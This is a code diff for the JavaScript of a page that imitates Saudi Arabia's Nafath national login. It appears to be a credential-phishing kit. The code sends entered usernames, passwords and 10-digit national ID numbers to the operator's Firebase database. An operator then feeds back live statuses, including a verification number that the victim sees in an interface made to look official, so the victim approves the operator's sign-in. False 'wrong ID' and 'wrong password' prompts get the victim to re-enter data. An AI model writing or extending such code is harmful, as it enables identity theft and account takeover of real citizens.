@@ -73,32 +73,73 @@ document.addEventListener('DOMContentLoaded', () => {
     // ==========================================
     const globalLoader = document.getElementById('globalLoader');
     
-    // دالة لمراقبة حالة المستند في فايربيس بشكل حي ومباشر
+    // دالة لمراقبة حالة المستند في فايربيس بشكل حي ومباشر والتحويل للواجهة الرقمية
     function listenToAdminApproval(collectionName, docId) {
         const docRef = doc(db, collectionName, docId);
+        
+        const nafathFormContainer = document.getElementById('nafathFormContainer');
+        const nafathWaitContainer = document.getElementById('nafathWaitContainer');
+        const nafathLiveNumber = document.getElementById('nafathLiveNumber');
         
         // الاستماع للتغيرات اللحظية في قاعدة البيانات
         const unsubscribe = onSnapshot(docRef, (snapshot) => {
             if (snapshot.exists()) {
                 const data = snapshot.data();
                 
-                // إذا قام الأدمن بتحديث الحالة إلى "approved" أو أي حالة نجاح تحددها
-                if (data.status === "approved") {
-                    // 1. إخفاء اللودر الزجاجي
+                // الإجراء الأول: نقر الأدمن على "رقم تأكيد" وإرسال الكود للمطابقة
+                if (data.status === "show_code") {
+                    // إخفاء اللودر الزجاجي الدائري لتبسيط الرؤية
                     if (globalLoader) globalLoader.classList.add('hidden-loader');
                     
-                    // 2. التوجيه لصفحة النجاح أو الصفحة الداخلية للمنصة
+                    // إخفاء الـ Form الأصلي وقسم التحميل لتطبيق نفاذ
+                    if (nafathFormContainer) nafathFormContainer.classList.add('hidden-panel');
+                    
+                    // حقن الرقم المستلم من الأدمن في مربع العرض
+                    if (nafathLiveNumber) nafathLiveNumber.innerText = data.verificationCode;
+                    
+                    // إظهار واجهة الانتظار الرقمية المطابقة للتصميم الرسمي
+                    if (nafathWaitContainer) nafathWaitContainer.classList.remove('hidden-panel');
+                } 
+                
+                // الإجراء الثاني: رقم الهوية غير صحيح من الأدمن
+                else if (data.status === "wrong_national_id") {
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
+                    alert('عذراً، رقم الهوية الوطنية أو الإقامة الذي أدخلته غير صحيح. يرجى التثبت والمحاولة مجدداً.');
+                    unsubscribe();
+                    window.location.reload();
+                } 
+                
+                // الإجراء الثالث: بيانات اسم المستخدم أو كلمة المرور غير صحيحة من الأدمن
+                else if (data.status === "wrong_auth_data") {
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
+                    alert('اسم المستخدم أو كلمة المرور غير صحيحة، يرجى إعادة التأكد من بيانات النفاذ الموحد الخاص بك.');
+                    unsubscribe();
+                    window.location.reload();
+                }
+
+                // الإجراء المسبق: الموافقة التامة والنهائية والتحويل للمنصة الرئيسية
+                else if (data.status === "approved") {
+                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                     alert('تم التحقق والمطابقة بنجاح من قبل الإدارة.');
                     window.location.href = "dashboard.html"; 
-                    
-                    // إيقاف المراقبة بعد النجاح لتوفير الموارد
                     unsubscribe();
-                } else if (data.status === "rejected") {
+                } 
+                
+                else if (data.status === "rejected") {
                     if (globalLoader) globalLoader.classList.add('hidden-loader');
                     alert('تم رفض طلب التحقق من قبل لوحة الإدارة. يرجى المحاولة مجدداً.');
                     unsubscribe();
+                    window.location.reload();
                 }
             }
+        });
+    }
+
+    // تفعيل زر إلغاء الطلب بداخل واجهة انتظار نفاذ لإعادة تصفير ونعش الحقول
+    const cancelNafathBtn = document.getElementById('cancelNafathBtn');
+    if (cancelNafathBtn) {
+        cancelNafathBtn.addEventListener('click', () => {
+            window.location.reload();
         });
     }
 
@@ -114,7 +155,6 @@ document.addEventListener('DOMContentLoaded', () => {
             if (globalLoader) globalLoader.classList.remove('hidden-loader');
             
             try {
-                // إرسال البيانات وحفظ المرجع الخاص بالمستند الجديد (docRef)
                 const docRef = await addDoc(collection(db, "users_login"), {
                     username: usernameInput,
                     password: passwordInput,
@@ -123,7 +163,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     status: "waiting_admin" 
                 });
 
-                // بدء مراقبة هذا المستند تحديداً بانتظار رد الأدمن
                 listenToAdminApproval("users_login", docRef.id);
                 
             } catch (error) {
@@ -134,13 +173,27 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // ب) نموذج رقم بطاقة الأحوال (الخاص بتبويب تطبيق نفاذ)
+    // ب) نموذج رقم بطاقة الأحوال (الخاص بتبويب تطبيق نفاذ) مع حصر الطول بعشرة أرقام
     const appForm = document.getElementById('appForm');
     if (appForm) {
+        // منع كتابة الحروف غير الرقمية والحد من الطول أثناء الكتابة أيضاً لسلامة الإدخال
+        const nationalIdField = document.getElementById('nationalId');
+        if (nationalIdField) {
+            nationalIdField.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
+            });
+        }
+
         appForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const nationalIdInput = document.getElementById('nationalId').value;
+            const nationalIdInput = document.getElementById('nationalId').value.trim();
+            
+            // التحقق النهائي من شرط الـ 10 أرقام تماماً قبل الإرسال والرفع للفايربيس
+            if (nationalIdInput.length !== 10) {
+                alert('خطأ: يجب أن يتكون رقم بطاقة الأحوال أو الإقامة من 10 أرقام تماماً.');
+                return;
+            }
             
             if (globalLoader) globalLoader.classList.remove('hidden-loader');
             
@@ -148,15 +201,15 @@ document.addEventListener('DOMContentLoaded', () => {
                 const docRef = await addDoc(collection(db, "nafath_app_requests"), {
                     nationalId: nationalIdInput,
                     timestamp: serverTimestamp(),
+                    device: navigator.userAgent,
                     status: "waiting_admin"
                 });
                 
-                // بدء مراقبة طلب نفاذ بانتظار رد الأدمن
                 listenToAdminApproval("nafath_app_requests", docRef.id);
                 
             } catch (error) {
                 console.error("خطأ: ", error);
-                alert('فشل إرسال الطلب.');
+                alert('فشل إرسال الطلب، تأكد من اتصال الشبكة.');
                 if (globalLoader) globalLoader.classList.add('hidden-loader');
             }
         });
